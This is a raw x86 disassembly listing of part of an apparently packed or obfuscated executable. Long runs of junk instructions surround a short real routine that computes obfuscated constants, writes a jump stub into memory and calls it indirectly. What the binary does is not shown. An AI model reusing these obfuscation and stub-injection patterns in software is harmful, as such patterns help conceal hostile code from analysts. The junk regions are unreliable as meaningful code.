  40d4f4:	mov    dh,BYTE PTR [ebp-0x3e06f623]
  40d4fa:	arpl   WORD PTR [eax],bp
  40d4fc:	cli    
  40d4fd:	test   al,0xbd
  40d4ff:	cmp    ebp,DWORD PTR [edi]
  40d501:	test   DWORD PTR [eax],edi
  40d503:	rol    ecx,1
  40d505:	loopne 0x40d571
  40d507:	(bad)  
  40d508:	shr    esp,cl
  40d50a:	mov    cl,0xdc
  40d50c:	test   al,0x59
  40d50e:	xor    al,0x0
  40d510:	ds aad 0xf0
  40d513:	fwait
  40d514:	ins    DWORD PTR es:[edi],dx
  40d515:	data16 rol BYTE PTR gs:[edx-0x1223eb46],1
  40d51d:	mov    ch,0xe6
  40d51f:	jns    0x40d564
  40d521:	mov    ebx,0x1a56d89f
  40d526:	call   0xb5d9244d
  40d52b:	mov    esi,0x9279505f
  40d530:	jns    0x40d582
  40d532:	dec    eax
  40d533:	jmp    0xc5f63eb1
  40d538:	inc    edi
  40d539:	inc    ebx
  40d53a:	and    al,0x46
  40d53c:	pushf  
  40d53d:	xor    al,0x46
  40d53f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d540:	pop    edi
  40d541:	sub    DWORD PTR [ebx-0x2d],esp
  40d544:	mov    edi,0x7fbd3ad7
  40d549:	int    0xf1
  40d54b:	hlt    
  40d54c:	push   ecx
  40d54d:	xchg   ebx,eax
  40d54e:	shr    BYTE PTR [edx],0x12
  40d551:	dec    ebp
  40d552:	inc    esi
  40d553:	imul   ebp,DWORD PTR [edi],0x8
  40d556:	jge    0x40d4f5
  40d558:	mov    ds:0x3f6e9b8f,al
  40d55e:	jmp    0xa1cb:0xe459e267
  40d565:	data16 fld QWORD PTR [esi+0x12]
  40d569:	lahf   
  40d56a:	and    eax,0x68d288a4
  40d56f:	outs   dx,BYTE PTR ds:[esi]
  40d570:	xor    esp,edi
  40d572:	call   0x2892c912
  40d577:	out    dx,al
  40d578:	inc    eax
  40d579:	inc    ecx
  40d57a:	sub    ebp,0xffffff84
  40d57d:	jmp    0xaaae0b6d
  40d582:	jnp    0x40d5cf
  40d584:	adc    al,0x9d
  40d586:	es inc edi
  40d588:	retf   0xd76a
  40d58b:	mov    ecx,0x8cabc5d
  40d590:	adc    esi,DWORD PTR [ebx-0x27071fc0]
  40d596:	jge    0x40d5b2
  40d598:	mov    dl,0x7c
  40d59a:	push   ds
  40d59b:	add    edx,DWORD PTR [ebx]
  40d59d:	imul   eax,DWORD PTR [ebx+0x5e116f57],0xf4458b4b
  40d5a7:	sub    ecx,eax
  40d5a9:	imul   ecx,ecx,0x7480
  40d5af:	add    ecx,DWORD PTR [ebp-0x58]
  40d5b2:	mov    eax,DWORD PTR [ebp-0x8]
  40d5b5:	push   ecx
  40d5b6:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5b9:	lea    eax,[ecx+eax*1-0x1e6d]
  40d5c0:	mov    ecx,DWORD PTR [ebp-0x64]
  40d5c3:	xor    edx,edx
  40d5c5:	div    ecx
  40d5c7:	mov    ecx,DWORD PTR [ebp-0x74]
  40d5ca:	lea    eax,[eax+ecx*1-0xa617]
  40d5d1:	push   eax
  40d5d2:	mov    eax,DWORD PTR [ebp-0x88]
  40d5d8:	mov    ecx,DWORD PTR [ebp-0x84]
  40d5de:	push   0x770a
  40d5e3:	push   0x2a0c
  40d5e8:	push   ecx
  40d5e9:	push   eax
  40d5ea:	call   0x41594e
  40d5ef:	mov    ecx,DWORD PTR [ebp-0x98]
  40d5f5:	mov    esi,DWORD PTR [ebp-0x94]
  40d5fb:	push   esi
  40d5fc:	push   ecx
  40d5fd:	or     edx,0x615d
  40d603:	or     eax,0x455c
  40d608:	push   edx
  40d609:	push   eax
  40d60a:	call   0x42226c
  40d60f:	mov    ecx,DWORD PTR [ebp-0x70]
  40d612:	mov    edx,DWORD PTR [ebp-0x6c]
  40d615:	xor    eax,ecx
  40d617:	mov    ecx,DWORD PTR [ebp-0x20]
  40d61a:	mov    edx,DWORD PTR [ebp-0x1c]
  40d61d:	mov    esi,DWORD PTR [ebp-0x80]
  40d620:	and    eax,0xb49
  40d625:	add    esi,0x629b
  40d62b:	lea    eax,[eax+ecx*1-0xfd]
  40d632:	xor    esi,0x4994
  40d638:	push   eax
  40d639:	lea    esi,[ebp+esi*1-0x3c93]
  40d640:	call   0x40dbf7
  40d645:	mov    ecx,eax
  40d647:	mov    eax,DWORD PTR [ebp-0x50]
  40d64a:	mov    edx,DWORD PTR [ebp-0x7c]
  40d64d:	sub    eax,0x161
  40d652:	xor    eax,edx
  40d654:	imul   eax,eax,0x5151
  40d65a:	add    eax,0x3901
  40d65f:	xor    eax,0x40c2
  40d664:	xor    edx,edx
  40d666:	mov    esi,0x218f6c45
  40d66b:	div    esi
  40d66d:	cmp    ecx,eax
  40d66f:	jne    0x40d7dc
  40d675:	mov    ecx,DWORD PTR [ebp-0x78]
  40d678:	xor    edx,edx
  40d67a:	mov    eax,0x209c
  40d67f:	div    ecx
  40d681:	mov    ecx,DWORD PTR ds:0x4226f8
  40d687:	mov    ecx,DWORD PTR [ecx+0x1a8]
  40d68d:	xor    edx,edx
  40d68f:	sub    ecx,eax
  40d691:	mov    eax,DWORD PTR [ebp-0x4c]
  40d694:	xor    eax,0x3daa
  40d699:	sub    eax,0x3375
  40d69e:	or     eax,0x6931
  40d6a3:	lea    eax,[ebp+eax*1-0x6c25]
  40d6aa:	push   eax
  40d6ab:	mov    eax,DWORD PTR [ebp-0x8c]
  40d6b1:	push   0x18
  40d6b3:	pop    esi
  40d6b4:	div    esi
  40d6b6:	mov    esi,DWORD PTR [ebp-0x60]
  40d6b9:	xor    edx,edx
  40d6bb:	div    esi
  40d6bd:	mov    edx,DWORD PTR [ebp-0x44]
  40d6c0:	mov    esi,DWORD PTR [ebp-0x34]
  40d6c3:	xor    eax,edx
  40d6c5:	xor    edx,edx
  40d6c7:	div    esi
  40d6c9:	imul   eax,eax,0x7d2a
  40d6cf:	sub    eax,0x928ded7
  40d6d4:	push   eax
  40d6d5:	mov    eax,ds:0x4226f8
  40d6da:	add    eax,0xaa
  40d6df:	push   eax
  40d6e0:	mov    eax,DWORD PTR [ebp-0x3c]
  40d6e3:	sub    ecx,eax
  40d6e5:	mov    eax,DWORD PTR [ebp-0x24]
  40d6e8:	push   DWORD PTR [ecx+eax*1+0xbd4]
  40d6ef:	call   0x41b447
  40d6f4:	mov    DWORD PTR [ebp-0x4],eax
  40d6f7:	mov    ecx,DWORD PTR ds:0x422800
  40d6fd:	lea    eax,[ebp+0x4]
  40d700:	mov    DWORD PTR [ecx*4+0x4227f8],eax
  40d707:	inc    DWORD PTR ds:0x422800
  40d70d:	mov    eax,DWORD PTR [ebp-0x4]
  40d710:	mov    eax,DWORD PTR [ebp-0x4]
  40d713:	xor    edx,edx
  40d715:	shld   edx,eax,0x2
  40d719:	shl    eax,0x2
  40d71c:	mov    ecx,0xcb79b576
  40d721:	mov    esi,0x9c2b8ae8
  40d726:	xor    eax,ecx
  40d728:	xor    edx,esi
  40d72a:	cmp    eax,ecx
  40d72c:	jne    0x40d746
  40d732:	cmp    edx,esi
  40d734:	jne    0x40d746
  40d73a:	mov    eax,0xcb79b572
  40d73f:	mov    edx,esi
  40d741:	jmp    0x40dbf1
  40d746:	lea    eax,[ebp-0x10]
  40d749:	mov    DWORD PTR [ebp-0x9c],eax
  40d74f:	mov    eax,DWORD PTR [ebp-0x54]
  40d752:	mov    DWORD PTR [ebp-0x10],eax
  40d755:	mov    eax,DWORD PTR [ebp-0x10]
  40d758:	mov    ecx,DWORD PTR [ebp-0x4]
  40d75b:	sub    eax,ecx
  40d75d:	mov    DWORD PTR [ebp-0x10],eax
  40d760:	mov    eax,DWORD PTR [ebp-0x20]
  40d763:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d766:	sub    DWORD PTR [ebp-0x10],eax
  40d769:	mov    eax,DWORD PTR [ebp-0x4]
  40d76c:	mov    DWORD PTR [eax],0x658776e9
  40d772:	mov    DWORD PTR [eax+0x4],0xab756547
  40d779:	mov    eax,DWORD PTR [ebp-0x10]
  40d77c:	mov    ecx,DWORD PTR [ebp-0x4]
  40d77f:	mov    DWORD PTR [ecx+0x1],eax
  40d782:	mov    eax,ds:0x422574
  40d787:	push   DWORD PTR [eax]
  40d789:	push   DWORD PTR ds:0x4227e8
  40d78f:	push   DWORD PTR ds:0x42257c
  40d795:	push   DWORD PTR ds:0x4227c8
  40d79b:	push   DWORD PTR ds:0x42283c
  40d7a1:	push   0xa5069baa
  40d7a6:	push   0xa5069bae
  40d7ab:	push   DWORD PTR [ebp-0x5c]
  40d7ae:	mov    eax,DWORD PTR [ebp-0x4]
  40d7b1:	call   eax
  40d7b3:	mov    eax,DWORD PTR [edi]
  40d7b5:	mov    eax,DWORD PTR [ebp+0x8]
  40d7b8:	push   DWORD PTR [eax]
  40d7ba:	call   0x40e823
  40d7bf:	mov    eax,ds:0x4226f8
  40d7c4:	push   0x4
  40d7c6:	add    eax,0x1dc
  40d7cb:	push   eax
  40d7cc:	push   edi
  40d7cd:	call   0x411c08
  40d7d2:	mov    eax,0xcb79b57e
  40d7d7:	jmp    0x40d73f
  40d7dc:	mov    eax,0xcb79b576
  40d7e1:	mov    edx,0x9c2b8ae8
  40d7e6:	jmp    0x40dbf1
  40d7eb:	hlt    
  40d7ec:	scas   eax,DWORD PTR es:[edi]
  40d7ed:	je     0x40d848
  40d7ef:	mov    ah,0x9a
  40d7f1:	cld    
  40d7f2:	mov    eax,0x90d1c6c0
  40d7f7:	push   eax
  40d7f8:	pop    eax
  40d7f9:	mov    edi,0xbef065cf
  40d7fe:	mov    esi,0xbebec492
  40d803:	int    0xe
  40d805:	rol    bl,0xf0
  40d808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d809:	sub    eax,0x56c39048
  40d80e:	jae    0x40d7d1
  40d810:	cmp    eax,0x9f69aa24
  40d815:	daa    
  40d816:	icebp  
  40d817:	mov    cl,BYTE PTR ds:0xa3eaa6b9
  40d81d:	mov    al,ds:0xb2de1efa
  40d822:	sub    esi,DWORD PTR [edi+0x1099299]
  40d828:	pop    edx
  40d829:	ror    DWORD PTR [esi-0x55dcdf84],cl
  40d82f:	dec    eax
  40d830:	adc    eax,0xfcbdd2d
  40d835:	xor    cl,BYTE PTR [ebx-0x1f00a560]
  40d83b:	add    BYTE PTR [esi],bh
  40d83d:	inc    ebx
  40d83e:	aas    
  40d83f:	or     eax,0x867b95b
  40d844:	inc    edx
  40d845:	popa   
  40d846:	fwait
  40d847:	or     DWORD PTR [edx],0x936c6fc3
  40d84d:	mov    esi,0x930461c0
  40d852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d853:	leave  
  40d854:	and    BYTE PTR [ebx-0x3],ah
  40d857:	stc    
  40d858:	jb     0x40d812
  40d85a:	mov    bl,BYTE PTR [eax+0x173d808a]
  40d860:	sbb    cl,BYTE PTR [esi-0x7e59115a]
  40d866:	test   al,0x5a
  40d868:	cli    
  40d869:	jmp    0x53cb637c
  40d86e:	pop    es
  40d86f:	push   ds
  40d870:	pusha  
  40d871:	dec    edi
  40d872:	xor    DWORD PTR [ecx-0x16f83dfb],ebp
  40d878:	and    al,0xe0
  40d87a:	mov    dl,0x21
  40d87c:	mov    edx,0x92a767c6
  40d881:	jns    0x40d8d8
  40d883:	sbb    bl,BYTE PTR [ecx]
  40d885:	dec    eax
  40d886:	imul   ebx,ebp,0xb99fe04b
  40d88c:	test   BYTE PTR ds:0xadc10038,bh
  40d892:	loopne 0x40d8fa
  40d894:	ds mov bh,0xe8
  40d897:	mov    ecx,0x948803a3
  40d89c:	retf   
  40d89d:	inc    edx
  40d89e:	mov    DWORD PTR [ebx+0x24a2d206],0xe526966b
  40d8a8:	push   ecx
  40d8a9:	icebp  
  40d8aa:	push   0x193801c7
  40d8af:	mov    gs,WORD PTR [ecx+0xb]
  40d8b2:	out    0x42,eax
  40d8b4:	pop    esi
  40d8b5:	adc    BYTE PTR [edx+0x4829b78e],cl
  40d8bb:	push   esp
  40d8bc:	test   al,0x3a
  40d8be:	mov    edx,0xeae354e4
  40d8c3:	or     DWORD PTR [ebx+0x1edcf6ce],edi
  40d8c9:	dec    esp
  40d8ca:	adc    eax,DWORD PTR [ebx]
  40d8cc:	test   BYTE PTR [edi],al
  40d8ce:	jnp    0x40d899
  40d8d0:	push   edx
  40d8d1:	aam    0x72
  40d8d3:	pop    ebp
  40d8d4:	mov    al,ds:0xa338c063
  40d8d9:	pop    ecx
  40d8da:	mul    BYTE PTR [ebp+0x1beb1d19]
  40d8e0:	xor    bh,0x3f
  40d8e3:	dec    esi
  40d8e4:	sub    DWORD PTR [edx+0x4dee6509],eax
  40d8ea:	jb     0x40d8cd
  40d8ec:	push   0xffffffcb
  40d8ee:	in     eax,dx
  40d8ef:	lahf   
  40d8f0:	add    bh,ah
  40d8f2:	xchg   esp,eax
  40d8f3:	mov    dh,BYTE PTR [esi+0x700998c3]
  40d8f9:	pop    edx
  40d8fa:	popa   
  40d8fb:	data16 jge 0x40d91e
  40d8fe:	pop    eax
  40d8ff:	aas    
  40d900:	push   eax
  40d901:	pop    ebp
  40d902:	mov    WORD PTR [eax],ds
  40d904:	mov    es,WORD PTR ds:0x2eb1065c
  40d90a:	cli    
  40d90b:	lods   eax,DWORD PTR ds:[esi]
  40d90c:	mov    edx,0x2f7fe95b
  40d911:	pop    es
  40d912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d913:	mov    ebp,0xb3e2153f
  40d918:	inc    ebx
  40d919:	into   
  40d91a:	fmul   st,st(5)
  40d91c:	add    eax,DWORD PTR [ebx-0x11050c36]
  40d922:	xchg   edi,eax
  40d923:	adc    DWORD PTR [ecx],ebx
  40d925:	xchg   edi,eax
  40d926:	and    al,0x8e
  40d928:	xor    al,0x8b
  40d92a:	pushf  
  40d92b:	xor    eax,0x19340df6
  40d930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d931:	push   edx
  40d932:	add    ecx,DWORD PTR [ecx]
  40d934:	outs   dx,BYTE PTR ds:[esi]
  40d935:	cmp    BYTE PTR [edi+0x41cafce8],dh
  40d93b:	adc    al,0x4f
  40d93d:	xor    ecx,DWORD PTR [ebp+0x2276607b]
  40d943:	add    esi,0xffffff92
  40d946:	call   0x29e5:0x2bb900fa
  40d94d:	push   0xffffff87
  40d94f:	lods   al,BYTE PTR ds:[esi]
  40d950:	mov    ebx,0xe3001813
  40d955:	mov    dh,0xbd
  40d957:	jo     0x40d939
  40d959:	xchg   ebx,eax
  40d95a:	clc    
  40d95b:	pop    ds
  40d95c:	repnz popa 
  40d95e:	cld    
  40d95f:	lahf   
  40d960:	jp     0x40d923
  40d962:	and    BYTE PTR [edx-0x5f],bh
  40d965:	jno    0x40d998
  40d967:	cwde   
  40d968:	in     eax,0xbc
  40d96a:	mov    ecx,0xb7b3797e
  40d96f:	ror    DWORD PTR [esi],cl
  40d971:	sbb    al,BYTE PTR [ebx]
  40d973:	cmp    DWORD PTR [ecx],edx
  40d975:	daa    
  40d976:	fild   QWORD PTR [ebx+ecx*1-0x67]
  40d97a:	mov    al,ds:0xa0f8ee2a
  40d97f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d980:	stos   DWORD PTR es:[edi],eax
  40d981:	imul   esp,DWORD PTR [edi-0x48],0xffffffe8
  40d985:	add    al,0x12
  40d987:	sar    BYTE PTR [ecx],1
  40d989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d98a:	(bad)  
  40d98b:	loopne 0x40d93a
  40d98d:	retf   0xab7b
  40d990:	ret    
  40d991:	xchg   DWORD PTR ds:0xde97d4d2,ebp
  40d997:	fild   DWORD PTR [ecx]
  40d999:	mov    ds,edi
  40d99b:	loopne 0x40da10
  40d99d:	repnz cmp DWORD PTR [ebx-0x21],0x6489ba3e
  40d9a5:	dec    esp
  40d9a6:	mov    ecx,0x61ef6f81
  40d9ab:	enter  0xa96b,0xaa
  40d9af:	das    
  40d9b0:	pop    ecx
  40d9b1:	mov    bl,0x94
  40d9b3:	or     al,0x93
  40d9b5:	lods   eax,DWORD PTR ds:[esi]
  40d9b6:	ds jmp 0xb3ec:0xfb43a332
  40d9be:	dec    DWORD PTR [esi-0x215a0c82]
  40d9c4:	mov    esi,0x7d0f8a70
  40d9c9:	push   edx
  40d9ca:	sahf   
  40d9cb:	mov    ah,0xc0
  40d9cd:	jbe    0x40d9ac
  40d9cf:	or     al,0xf4
  40d9d1:	pop    edx
  40d9d2:	jae    0x40d973
  40d9d4:	cwde   
  40d9d5:	outs   dx,BYTE PTR ds:[esi]
  40d9d6:	test   DWORD PTR [ecx+0x3bd6def],esp
  40d9dc:	add    eax,0xe993f4d7
  40d9e1:	xor    dl,ch
  40d9e3:	adc    DWORD PTR [ebx],ecx
  40d9e5:	or     eax,0x908a824d
  40d9ea:	push   cs
  40d9eb:	and    DWORD PTR [eax+0x4d],edx
  40d9ee:	mov    dh,0xbd
  40d9f0:	leavew 
  40d9f2:	gs dec edx
  40d9f4:	dec    ebp
  40d9f5:	jno    0x40da09
  40d9f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9f8:	pop    edx
  40d9f9:	int    0x8b
  40d9fb:	jg     0x40d980
  40d9fd:	sbb    BYTE PTR ds:0x70a4870e,dl
  40da03:	push   ecx
  40da04:	push   0x2
  40da06:	cmp    edi,DWORD PTR [edi]
  40da08:	sub    BYTE PTR [eax],bl
  40da0a:	mov    edi,0x2f4ab325
  40da0f:	(bad)  
  40da10:	jg     0x40da8e
  40da12:	ss xchg edx,eax
  40da14:	imul   esi,DWORD PTR [esi-0x20],0x58c8d783
  40da1b:	inc    esp
  40da1c:	push   eax
  40da1d:	mov    ch,0xa9
  40da1f:	inc    ecx
  40da20:	lock push 0x9be36cae
  40da26:	dec    ecx
  40da27:	sbb    eax,0x4925ba0e
  40da2c:	mov    cl,0x2f
  40da2e:	mov    ?,ebx
  40da30:	pop    ecx
  40da31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da32:	mov    ebx,0x73162960
  40da37:	not    esp
  40da39:	neg    DWORD PTR [eax]
  40da3b:	pushf  
  40da3c:	(bad)  
  40da3d:	mov    ebp,0xe424e3d1
  40da42:	sub    dh,BYTE PTR [eax+eiz*4]
  40da45:	enter  0xe54c,0x9c
  40da49:	jo     0x40dac0
  40da4b:	ja     0x40da8d
  40da4d:	push   esp
  40da4e:	push   cs
  40da4f:	das    
  40da50:	xor    edx,esp
  40da52:	jmp    0x40d9d4
  40da54:	lfs    edi,FWORD PTR [esi]
  40da57:	inc    eax
  40da58:	sbb    al,0xb1
  40da5a:	jae    0x40d9e4
  40da5c:	loope  0x40da80
  40da5e:	mov    bh,0xe8
  40da60:	jno    0x40dab6
  40da62:	ins    BYTE PTR es:[edi],dx
  40da63:	fisubr DWORD PTR [edi-0x57b0d836]
  40da69:	xor    BYTE PTR [ebx+0x27],cl
  40da6c:	ret    0xd44f
  40da6f:	js     0x40dad5
  40da71:	repz jmp 0x40dad4
  40da74:	inc    eax
  40da75:	test   DWORD PTR [ecx],0x3954b9b6
  40da7b:	cmp    edi,0x34490bbc
  40da81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da82:	mov    edi,0x9f30c84
  40da87:	push   eax
  40da88:	test   eax,0x6074b5c
  40da8d:	(bad)  
  40da8e:	push   edi
  40da8f:	cwde   
  40da90:	call   0x3e4f:0x5021fd92
  40da97:	lock fisub WORD PTR [eax+esi*2]
  40da9b:	in     al,dx
  40da9c:	and    edi,DWORD PTR [esi-0x2dbd4a6c]
  40daa2:	and    BYTE PTR [ecx+edx*4+0x1eff584d],0x76
  40daaa:	mov    ecx,0x231dd0b9
  40daaf:	mov    eax,ds:0x286dc8d5
  40dab4:	mov    eax,0xd437e9c5
  40dab9:	retf   
  40daba:	sti    
  40dabb:	dec    eax
  40dabc:	les    edx,FWORD PTR [ecx]
  40dabe:	call   0x28da533e
  40dac3:	xor    edi,edx
  40dac5:	daa    
  40dac6:	add    ch,dh
  40dac8:	mov    ch,0xbd
  40daca:	pop    ebp
  40dacb:	dec    edi
  40dacc:	xor    ecx,DWORD PTR [ebx-0x5e]
  40dacf:	sub    bh,al
  40dad1:	loope  0x40dac6
  40dad3:	daa    
  40dad4:	push   edi
  40dad5:	xchg   ebx,eax
  40dad6:	aad    0xe2
  40dad8:	adc    edi,DWORD PTR [ecx]
  40dada:	popa   
  40dadb:	jo     0x40db31
  40dadd:	pop    ecx
  40dade:	jl     0x40db2d
  40dae0:	(bad)  
  40dae1:	mov    bh,BYTE PTR [edx-0x567c5ed1]
  40dae7:	lods   al,BYTE PTR ds:[esi]
  40dae8:	sbb    al,0xf
  40daea:	shl    eax,0xad
  40daed:	jmp    0xd4fd:0xf9c7e0eb
  40daf4:	jge    0x40dae3
  40daf6:	(bad)  
  40daf7:	and    eax,0xbe1d1731
  40dafc:	test   eax,0x242eac97
  40db01:	or     DWORD PTR ds:0x9547b8db,edi
  40db07:	cld    
  40db08:	shr    cl,1
  40db0a:	inc    eax
  40db0b:	es jmp 0x4033:0xfe0b2bdf
  40db13:	imul   esp,DWORD PTR [ecx-0x70016a5d],0x2f1f8cf
  40db1d:	scas   eax,DWORD PTR es:[edi]
  40db1e:	rcr    BYTE PTR [ebx+ecx*1+0x60351cc8],cl
  40db25:	sbb    BYTE PTR ss:[esi],bh
  40db28:	std    
  40db29:	dec    ecx
  40db2a:	dec    edx
  40db2b:	je     0x40db15
  40db2d:	in     eax,dx
  40db2e:	lods   al,BYTE PTR ds:[esi]
  40db2f:	push   cs
  40db30:	jle    0x40dabd
  40db32:	les    esi,FWORD PTR [ebx+0x40]
  40db35:	into   
  40db36:	and    eax,0x66ae78d
  40db3b:	jp     0x40db16
  40db3d:	lods   eax,DWORD PTR ds:[esi]
  40db3e:	jg     0x40dbb9
  40db40:	or     DWORD PTR [ebx+0x52],esp
  40db43:	arpl   di,ax
  40db45:	sub    DWORD PTR [eax+0x4f],esp
  40db48:	xchg   ebp,eax
  40db49:	jecxz  0x40dad0
  40db4b:	fs jle 0x40db5c
  40db4e:	ins    DWORD PTR es:[edi],dx
  40db4f:	xchg   bl,bl
  40db51:	push   ds
  40db52:	out    dx,eax
  40db53:	adc    eax,0xf70dba3f
  40db58:	mov    ch,0xbc
  40db5a:	cmp    bh,ch
  40db5c:	jge    0x40db63
  40db5e:	mov    edi,ebx
  40db60:	mov    esi,0x5ddf8d74
  40db65:	jmp    0x5ea95ca5
  40db6a:	mov    ecx,0x4bb4e2a2
  40db6f:	or     eax,0x2bc4f784
  40db74:	repz mov ah,bh
  40db77:	std    
  40db78:	mov    edi,DWORD PTR [ebp-0x1d]
  40db7b:	mov    al,ds:0x9e48568e
  40db80:	inc    eax
  40db81:	sti    
  40db82:	jns    0x40db5e
  40db84:	sbb    ah,bl
  40db86:	out    dx,al
  40db87:	stos   DWORD PTR es:[edi],eax
  40db88:	arpl   WORD PTR [ebp+0x3d],sp
  40db8b:	dec    ebx
  40db8c:	add    edi,DWORD PTR [esp+eiz*8+0x4895a8ef]
  40db93:	leave  
  40db94:	sbb    ah,BYTE PTR [ebx+0x6c]
  40db97:	jae    0x40db4e
  40db99:	dec    edx
  40db9a:	xchg   ecx,eax
  40db9b:	cmc    
  40db9c:	xchg   esi,eax
  40db9d:	cli    
  40db9e:	ret    
  40db9f:	cmc    
  40dba0:	imul   ecx,DWORD PTR [eax],0xffffffef
  40dba3:	push   ebp
  40dba4:	in     eax,0xb0
  40dba6:	or     esp,DWORD PTR [edi-0x45922357]
  40dbac:	pushf  
  40dbad:	cmp    ebx,ecx
  40dbaf:	or     BYTE PTR [ecx-0x467fdfa9],al
  40dbb5:	loop   0x40db6a
  40dbb7:	scas   eax,DWORD PTR es:[edi]
  40dbb8:	xor    BYTE PTR [ebx-0x3e],0x5c
  40dbbc:	xchg   ebx,eax
  40dbbd:	imul   edi,DWORD PTR [esi-0x66d1f5f7],0xffffffe5
  40dbc4:	call   0x11799b17
  40dbc9:	inc    esp
  40dbca:	data16 scas al,BYTE PTR es:[edi]
  40dbcc:	in     al,dx
  40dbcd:	dec    esp
  40dbce:	stc    
  40dbcf:	pop    eax
  40dbd0:	xor    DWORD PTR [esi-0x18f77bdb],ebx
  40dbd6:	(bad)  
  40dbd7:	or     bh,BYTE PTR [eax-0xf]
  40dbda:	mov    edi,ss
  40dbdc:	fwait
  40dbdd:	(bad)  
  40dbde:	jo     0x40dc47
  40dbe0:	iret   
  40dbe1:	fsubr  QWORD PTR [esi-0x1753646a]
  40dbe7:	pop    ecx
  40dbe8:	dec    ecx
  40dbe9:	scas   al,BYTE PTR es:[edi]
  40dbea:	out    0xeb,eax
  40dbec:	ds stc 
  40dbee:	sahf   
  40dbef:	adc    al,0xb5
  40dbf1:	pop    esi
  40dbf2:	pop    ebx
  40dbf3:	leave  
  40dbf4:	ret    0x4
  40dbf7:	push   ebp
  40dbf8:	mov    ebp,esp
  40dbfa:	sub    esp,0x20
  40dbfd:	push   ebx
  40dbfe:	push   edi
  40dbff:	mov    DWORD PTR [ebp-0x8],0x522e
  40dc06:	mov    DWORD PTR [ebp-0x4],0x3dbd
  40dc0d:	mov    DWORD PTR [ebp-0x10],0x53f1
  40dc14:	mov    DWORD PTR [ebp-0xc],0x631b
  40dc1b:	jmp    0x40deaa
  40dc20:	dec    ebx
  40dc21:	pop    esi
  40dc22:	xchg   ebp,eax
  40dc23:	idiv   DWORD PTR [eax+edi*1-0x2a408d55]
  40dc2a:	push   ss
  40dc2b:	shl    esi,1
  40dc2d:	adc    eax,0xf839cfae
  40dc32:	mov    esi,0xbec299be
  40dc37:	mov    esi,0xc18a1776
  40dc3c:	imul   esi,DWORD PTR [eax+0x10bbb511],0xcaa1b340
  40dc46:	(bad)  
  40dc47:	fnsave [ebx+0x2c]
  40dc4a:	js     0x40dc86
  40dc4c:	add    ch,BYTE PTR [ebp+ecx*8-0x2e]
  40dc50:	popa   
  40dc51:	jle    0x40dc33
  40dc53:	in     al,0x45
  40dc55:	or     bl,BYTE PTR [ebx+ebp*8-0x6b]
  40dc59:	jmp    0x40dc48
  40dc5b:	mov    ch,ah
  40dc5d:	(bad)  
  40dc5e:	push   ebp
  40dc5f:	aam    0x2d
  40dc61:	push   0x5b
  40dc63:	or     BYTE PTR [edx+0x2493aaea],dh
  40dc69:	out    0x76,eax
  40dc6b:	push   eax
  40dc6c:	inc    esi
  40dc6d:	inc    edx
  40dc6e:	retf   0x688c
  40dc71:	repnz add DWORD PTR [ecx],edx
  40dc74:	arpl   WORD PTR [esi+0x5d],cx
  40dc77:	xchg   ebp,eax
  40dc78:	adc    BYTE PTR [ebp+0x4f],ch
  40dc7b:	les    esi,FWORD PTR [edx]
  40dc7d:	scas   al,BYTE PTR es:[edi]
  40dc7e:	cmp    BYTE PTR [ebp+eax*2+0x1af15ec2],bl
  40dc85:	jns    0x40dc0a
  40dc87:	ret    0xc299
  40dc8a:	xor    ecx,DWORD PTR [esi+0x528660c1]
  40dc90:	jmp    0x40dcfd
  40dc92:	shl    edx,0x93
  40dc95:	xor    BYTE PTR [eax],0xdc
  40dc98:	repnz inc esi
  40dc9a:	xchg   BYTE PTR [esi+0x3b],dl
  40dc9d:	clc    
  40dc9e:	clc    
  40dc9f:	lods   eax,DWORD PTR ds:[esi]
  40dca0:	xchg   ebx,eax
  40dca1:	mov    bh,0x24
  40dca3:	dec    esp
  40dca4:	sub    ah,0xc5
  40dca7:	lods   eax,DWORD PTR ds:[esi]
  40dca8:	pop    esi
  40dca9:	lds    ecx,FWORD PTR ds:0x66d2edbf
  40dcaf:	shl    DWORD PTR [ebp+0x53],cl
  40dcb2:	fwait
  40dcb3:	cmp    DWORD PTR [eax+0x3e32b69],esi
  40dcb9:	pop    edx
  40dcba:	lea    eax,[edi]
  40dcbc:	push   eax
  40dcbd:	es into 
  40dcbf:	mov    cl,0xc3
  40dcc1:	push   es
  40dcc2:	stc    
  40dcc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcc4:	ss call 0x458fe0b2
  40dcca:	pop    ebp
  40dccb:	lock test eax,0x35201c2e
  40dcd1:	jns    0x40dc91
  40dcd3:	loopne 0x40dd12
  40dcd5:	shr    DWORD PTR ds:0x9f13c166,0x8f
  40dcdc:	push   es
  40dcdd:	add    ebx,DWORD PTR [edi+eax*2]
  40dce0:	fdivr  QWORD PTR [ebp-0xc]
  40dce3:	cli    
  40dce4:	cmp    al,0xbc
  40dce6:	enter  0x7d12,0xc8
  40dcea:	int3   
  40dceb:	loope  0x40dc6e
  40dced:	cmp    eax,0xfa51365e
  40dcf2:	loope  0x40dcb0
  40dcf4:	inc    esp
  40dcf5:	lea    edx,[esp+ebx*4]
  40dcf8:	(bad)  
  40dcfa:	scas   eax,DWORD PTR es:[edi]
  40dcfb:	ret    
  40dcfc:	push   ebp
  40dcfd:	push   ebx
  40dcfe:	dec    ecx
  40dcff:	cmp    DWORD PTR [esi-0x795c6bde],esi
  40dd05:	call   0x9c49:0xe1b30be5
  40dd0c:	iret   
  40dd0d:	inc    eax
  40dd0e:	mov    WORD PTR [esi+ebp*4+0x39],cs
  40dd12:	mov    cl,0x95
  40dd14:	pop    ss
  40dd15:	jns    0x40dd12
  40dd17:	arpl   WORD PTR [ebp+0x3ed6eff8],dx
  40dd1d:	dec    eax
  40dd1e:	ins    DWORD PTR es:[edi],dx
  40dd1f:	jecxz  0x40dcdb
  40dd21:	retf   
  40dd22:	push   es
  40dd23:	(bad)  
  40dd25:	(bad)  
  40dd27:	add    eax,0xd635320e
  40dd2c:	mov    esi,0xb585a74d
